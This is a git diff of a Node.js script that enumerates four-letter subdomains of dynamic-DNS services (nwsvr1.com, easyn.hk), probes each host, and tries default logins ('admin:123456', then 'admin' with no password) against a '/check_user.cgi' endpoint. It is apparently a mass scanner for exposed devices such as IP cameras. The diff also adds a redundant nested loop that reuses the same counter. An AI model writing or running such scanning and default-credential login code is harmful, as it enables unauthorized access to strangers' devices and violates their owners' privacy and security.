@@ -14,24 +14,23 @@ var logger = new (winston.Logger)({
     new (winston.transports.File)({
       name: 'error',
       filename: './log/device.error.log',
-      level: 'error'
     })
   ]
 });
 
 var url = '';
-
-
-for(a=118 ; a<119 ; a++) {
+for(a=97 ; a<98 ; a++) {
+for(a=97 ; a<99 ; a++) {
 	for(b=97 ; b<123 ; b++) {
 		for(c=97 ; c<123 ; c++) {
 			for(d=97 ; d<123 ; d++) {
-				url = 'http://005' + String.fromCharCode(a,b,c,d) + '.nwsvr1.com';
+				url = 'http://' + String.fromCharCode(a,b,c,d) + '.easyn.hk';
 				getLink(url);
-                sleep.usleep(5000);
+                sleep.usleep(500);
 			}
 		}
 	}
+}
 }
 
 //url = 'http://002mhew.nwsvr.com';
@@ -68,7 +67,7 @@ function checkCountry(url,link) {
 }
 
 function login(url,link) {
-	link = 'http://admin:123456@' + link.substr(7) + '/check_user.cgi';
+	link = 'http://admin@' + link.substr(7) + '/check_user.cgi';
 
     request({url: link}, function (error, response, body) {
     if (!error && response.statusCode == 200) {
